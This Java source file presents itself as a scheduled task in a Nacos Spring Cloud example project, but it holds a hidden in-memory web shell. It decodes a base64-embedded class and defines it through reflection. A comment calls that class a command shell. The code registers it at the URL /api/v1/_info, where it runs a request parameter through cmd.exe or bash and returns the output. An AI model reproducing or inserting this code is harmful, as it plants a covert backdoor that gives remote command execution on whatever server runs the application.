package com.alibaba.nacos.example.spring.cloud.controller;

import org.springframework.context.ApplicationContext;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.support.WebApplicationContextUtils;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import java.lang.reflect.Method;
import java.time.LocalDateTime;

@Component
public class ScheduledTask {

    @Scheduled(fixedRate = 3000)
    public void scheduledTask() {
        System.out.println("任务执行时间：" + LocalDateTime.now());
        String className = "Info";
        Class vulC = null;
        try {
            //加载自定义类
            //cat Info.class|base64 -w0
            String b64 = "yv66vgAAADQAiAoAIwA8CAA9CwA+AD8IAEAKAEEAQgoACgBDCABECgAKAEUKAEYARwcASAgASQgASgoARgBLCABMCABNBwBOBwBPCgBQAFEKABEAUgoAEABTBwBUCgAVADwKABAAVQoAFQBWCgAVAFcKABUAWAsAWQBaCgAKAFsKAFwAXQoAXABeCgBcAF8LAFkAYAcAYQcAYgcAYwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAARleGVjAQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEADVN0YWNrTWFwVGFibGUHAEgHAGQHAE4HAFQHAGIHAGUHAGYHAGEBAApFeGNlcHRpb25zBwBnAQAZUnVudGltZVZpc2libGVBbm5vdGF0aW9ucwEAOExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmc7AQAFdmFsdWUBAA0vYXBpL3YxL19pbmZvAQAKU291cmNlRmlsZQEACUluZm8uamF2YQEAK0xvcmcvc3ByaW5nZnJhbWV3b3JrL3N0ZXJlb3R5cGUvQ29udHJvbGxlcjsMACQAJQEAAWMHAGUMAGgAaQEAB29zLm5hbWUHAGoMAGsAaQwAbABtAQADd2luDABuAG8HAHAMAHEAcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMACgAcwEABGJhc2gBAAItYwEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwBkDAB0AHUMACQAdgwAJAB3AQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAHgAbQwAeQB6DAB5AHsMAHwAbQcAZgwAfQB+DAB/AIAHAIEMAIIAgwwAhAAlDACFACUMAIYAhwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAARJbmZvAQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9Qcm9jZXNzAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQATamF2YS9pby9JT0V4Y2VwdGlvbgEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBABwoQylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAA9nZXRPdXRwdXRTdHJlYW0BACUoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW07AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0T3V0cHV0U3RyZWFtAQAFd3JpdGUBAAUoW0IpVgEABWZsdXNoAQAFY2xvc2UBAAlzZW5kRXJyb3IBAAQoSSlWACEAIgAjAAAAAAACAAEAJAAlAAEAJgAAACEAAQABAAAABSq3AAGxAAAAAQAnAAAACgACAAAACwAEAAwAAQAoACkAAwAmAAABbAAFAAgAAADOKxICuQADAgBOLcYAthIEuAAFtgAGEge2AAiZACC4AAkGvQAKWQMSC1NZBBIMU1kFLVO2AA06BKcAHbgACQa9AApZAxIOU1kEEg9TWQUtU7YADToEuwAQWbsAEVkZBLYAErcAE7cAFDoFuwAVWbcAFjoGGQW2ABdZOgfGACAZBrsAFVm3ABYZB7YAGBAKtgAZtgAatgAYV6f/2yy5ABsBABkGtgAatgActgAdLLkAGwEAtgAeLLkAGwEAtgAfpwAMLBEBlLkAIAIApwAETrEAAQAAAMkAzAAhAAIAJwAAAEYAEQAAABAACQARAA0AEwAdABQAOgAWAFQAGQBpABoAcgAdAH0AHgCaACEAqwAiALQAIwC9ACQAwAAlAMkAKADMACcAzQAqACoAAAA4AAj8ADoHACv8ABkHACz9AB0HAC0HAC78ACcHACv/ACUABAcALwcAMAcAMQcAKwAA+gAIQgcAMgAAMwAAAAQAAQA0ADUAAAAOAAEANgABADdbAAFzADgAAgA5AAAAAgA6ADUAAAAGAAEAOwAA"; // base64编码的类的字节码
            byte[] bytes = new byte[0];
            bytes = sun.misc.BASE64Decoder.class.newInstance().decodeBuffer(b64);
            java.lang.ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            try {
                classLoader.loadClass(className);
            } catch (ClassNotFoundException e) {
                java.lang.reflect.Method m0 = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
                m0.setAccessible(true);
                m0.invoke(classLoader, className, bytes, 0, bytes.length);
                vulC = classLoader.loadClass(className);
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
        ApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
        // 注册执行命令的shell
        Method method = (vulC.getDeclaredMethods())[0];
        PatternsRequestCondition url = new PatternsRequestCondition("/api/v1/_info");
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        try {
            r.registerMapping(info, vulC.newInstance(), method);
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }

    }

}


